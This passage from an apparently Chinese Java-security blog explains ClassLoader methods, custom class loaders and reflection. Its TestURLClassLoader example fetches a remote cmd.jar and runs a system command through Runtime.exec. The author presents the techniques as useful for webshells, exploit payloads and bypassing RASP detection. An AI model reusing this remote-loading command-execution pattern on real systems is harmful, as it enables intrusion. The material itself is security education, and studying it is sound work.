ClassLoader</code>加载。</li><li>如果上一步无法加载<code>TestHelloWorld</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>TestHelloWorld</code>类。</li><li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>com.anbai.sec.classloader.TestHelloWorld</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li><li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li></ol><p>简单来说顺序就是：</p><ol><li>先用<code>findLoadedClass</code>方法检查JVM是否已经加载过</li><li>寻找父类进行加载，不行的话就用JVM的<code>Bootstrap ClassLoader</code>加载</li><li>自身调用<code>findClass</code>方法尝试加载</li><li><code>defineClass</code>自己定义一个加载器进行加载</li></ol><p>哪一步成功了就直接返回，没成功就继续按下一步走</p><h3 id="2、findCLass：查找指定的Java类"><a href="#2、findCLass：查找指定的Java类" class="headerlink" title="2、findCLass：查找指定的Java类"></a>2、findCLass：查找指定的Java类</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">Class</span>&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3、findLoadedClass：查找JVM已经加载过的类"><a href="#3、findLoadedClass：查找JVM已经加载过的类" class="headerlink" title="3、findLoadedClass：查找JVM已经加载过的类"></a>3、findLoadedClass：查找JVM已经加载过的类</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">Class</span>&lt;?&gt; findLoadedClass(String <span class="keyword">name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="comment">!checkName(name))</span></span><br><span class="line">            <span class="keyword">return</span> null;</span><br><span class="line">        <span class="keyword">return</span> findLoadedClass0(<span class="keyword">name</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass-方法配合使用。"><a href="#4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass-方法配合使用。" class="headerlink" title="4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用。"></a>4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用。</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">return</span> <span class="title">defineClass</span><span class="params">(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>)</span></span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="5、resolveClass：链接指定Java类"><a href="#5、resolveClass：链接指定Java类" class="headerlink" title="5、resolveClass：链接指定Java类"></a>5、resolveClass：链接指定Java类</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="function"><span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">native</span> <span class="function"><span class="keyword">void</span> <span class="title">resolveClass0</span><span class="params">(Class c)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p>因为在实际应用过程中，我们不仅仅只希望使用classpath当中指定的类或者jar包进行调用使用，我们有时希望调用本地磁盘文件或者网络还可以使用自定义类加载器的方式。</p><p>在上面loadClass方法分析中，他内部其实是调用findClass(String) 方法来装载类，所以我们要想加载自己自定义的类，就是覆盖这个findClass(String) 方法，而不是loadClass方法。</p><p>如果<code>com.anbai.sec.classloader.TestHelloWorld</code>类存在的情况下，我们可以使用如下代码即可实现调用<code>hello</code>方法并输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TestHelloWorld</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestHelloWorld</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> t.hello();</span><br><span class="line">        System.out.println(str);</span><br></pre></td></tr></table></figure><p>但是如果<code>com.anbai.sec.classloader.TestHelloWorld</code>根本就不存在于我们的<code>classpath</code>，那么我们可以使用自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法的时候传入<code>TestHelloWorld</code>类的字节码的方式来向JVM中定义一个<code>TestHelloWorld</code>类，最后通过反射机制就可以调用<code>TestHelloWorld</code>类的<code>hello</code>方法了。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword"><span class="keyword">extends</span> <span class="type">ClassLoader</span></span> </span>&#123;</span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> testClassName = <span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>;</span><br><span class="line">    <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> byte[] testClassBytes = <span class="keyword">new</span> <span class="type">byte</span>[]&#123;</span><br><span class="line">            <span class="number">-54</span>, <span class="number">-2</span>, <span class="number">-70</span>, <span class="number">-66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, <span class="number">-73</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">-79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">-80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(<span class="keyword">String</span> name) throws ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> <span class="type">TestClassLoader</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line">            <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">            Object testInstance = testClass.<span class="keyword">new</span><span class="type">Instance</span>();</span><br><span class="line">            <span class="comment">// 反射获取hello方法</span></span><br><span class="line">            Method method = testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">            <span class="keyword">String</span> str = (<span class="keyword">String</span>) method.invoke(testInstance);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上代码简单简单来说就是：</p><ol><li>先自己写个类继承自<code>java.lang.ClassLoader</code>，因为java默认遵循双亲委派模型，通过继承<code>ClassLoader</code>，可以覆盖默认的类加载逻辑，实现自定义的委派策略。然后再自己命名一个类加载器，将自己想要实现的类和方法以字节码数组写入加载器中，因为前面说过的，JVM只能识别字节码。然后重写方法<code>findClass</code>，目的是仅当请求加载的类名与刚才自己命名的类加载器相匹配时，才执行自定义的类定义逻辑。最后使用<code>defineClass</code>方法将字节数组转换为<code>Class</code>对象，至此就创建了一个自定义的类加载器</li><li>先创建一个刚才自定义类加载器的实例，再使用自定义的类加载器加载自定义类，并且使用<code>newInstance()</code>创建自定义类的一个实例，也可以直接实例化。然后利用反射机制用<code>getClass()</code>获取实例化类的对象，并且用<code>getMethod</code>获取自定义的方法，最后使用<code>invoke</code>方法反射性地调用<code>hello</code>方法，并捕获返回的字符串结果。</li></ol></blockquote><p>利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码（只能算弱加密了）</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p><p><strong>TestURLClassLoader.java示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://javaweb.org/tools/cmd.jar&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cmdClass</span> <span class="operator">=</span> ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, cmd);</span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span>           <span class="variable">in</span>   <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程的<code>cmd.jar</code>中就一个<code>CMD.class</code>文件，对应的编译之前的代码片段如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="built_in">Process</span> <span class="title">exec</span><span class="params">(<span class="type">String</span> cmd)</span> throws IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.<span class="built_in">getRuntime</span>().<span class="built_in">exec</span>(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行结果如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">README.md </span><br><span class="line">gitbook </span><br><span class="line"><span class="keyword">javaweb-sec-source </span></span><br><span class="line"><span class="keyword">javaweb-sec.iml </span></span><br><span class="line"><span class="keyword">jni </span></span><br><span class="line">pom.xml</span><br></pre></td></tr></table></figure><p>也可以加载本地的文件</p><p>参考文章：</p><p><a href="https://javasec.org/javase/ClassLoader/">https://javasec.org/javase/ClassLoader/</a></p><p><a href="https://xz.aliyun.com/t/9002?time__1311=n4+xuDgD9DyAGQD7DnGDlP6eKO/CrDB7QOe3D&alichlgref=https://xz.aliyun.com/u/24696#toc-17">https://xz.aliyun.com/t/9002?time__1311=n4%2BxuDgD9DyAGQD7DnGDlP6eKO%2FCrDB7QOe3D&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F24696#toc-17</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反射机制</title>
      <link href="/2024/06/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/06/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1><h2 id="Java反射机制简介"><a href="#Java反射机制简介" class="headerlink" title="Java反射机制简介"></a>Java反射机制简介</h2><p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法&#x2F;访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><h2 id="反射组成相关的类"><a href="#反射组成相关的类" class="headerlink" title="反射组成相关的类"></a>反射组成相关的类</h2><p>反射机制相关操作一般位于java.lang.reflect包中，java反射机制组成需要重点注意以下的类：</p><p>java.lang.Class：类对象;</p><p>java.lang.reflect.Constructor：类的构造器对象;</p><p>java.lang.reflect.Field：类的属性对象;</p><p>java.lang.reflect.Method：类的方法对象;</p><h2 id="反射常见使用的方法"><a href="#反射常见使用的方法" class="headerlink" title="反射常见使用的方法"></a>反射常见使用的方法</h2><p>获取类的方法：forname</p><p>实例化类对象的方法：newInstance</p><p>获取函数的方法：getMethod</p><p>执行函数的方法：invoke</p><h2 id="class对象的获取方法"><a href="#class对象的获取方法" class="headerlink" title="class对象的获取方法"></a>class对象的获取方法</h2><p>java反射机制的原理基础是理解Class类，在反射中，我们想获取一个类或调用一个类的方法，需要先获取到该类的Class对象。对于普通用户我们可以采用以下方法创建实例：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person test <span class="operator">=</span> new Person()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>但创建class类的实例对象却不能使用上述方法，运行会抛出错误，因为Class类是private私有属性，我们无法通过创建对象的方式来获取class对象。一般我们获取class对象就有以下三种方法</p><h4 id="类的-class属性"><a href="#类的-class属性" class="headerlink" title="类的.class属性"></a>类的.class属性</h4><p>第一种就是最简单明了的方式，我们可以通过类名的属性class获取。</p><p>格式：<code>类名.class</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c1<span class="operator">=</span>ReflectDemo.class<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="实例化对象的getClass-方法"><a href="#实例化对象的getClass-方法" class="headerlink" title="实例化对象的getClass()方法"></a>实例化对象的getClass()方法</h4><p>第二种我们可以先实例化一个对象，之后在调用getClass()方法。对象的 <code>getClass</code> 方法用于获取当前对象的运行时类。</p><p>格式：<code>对象.getclass</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReflectDemo demo2<span class="operator">=</span> new ReflectDemo()<span class="comment">;</span></span><br><span class="line">Class c2 <span class="operator">=</span> demo2.getClass()<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="Class-forName-String-className"><a href="#Class-forName-String-className" class="headerlink" title="Class.forName(String className)"></a>Class.forName(String className)</h4><p>如果知道一个<code>class</code>的完整类名，可以通过静态方法<code>Class.forName()</code>获取。</p><p>格式：<code>Class.forName(&quot;类的完整类名&quot;)</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c3 <span class="operator">=</span> Class.forName(<span class="string">&quot;reflectdemo.ReflectDemo&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>分别利用这三种方法获取当前类Class对象的当前类名，实例：</p><figure class="highlight 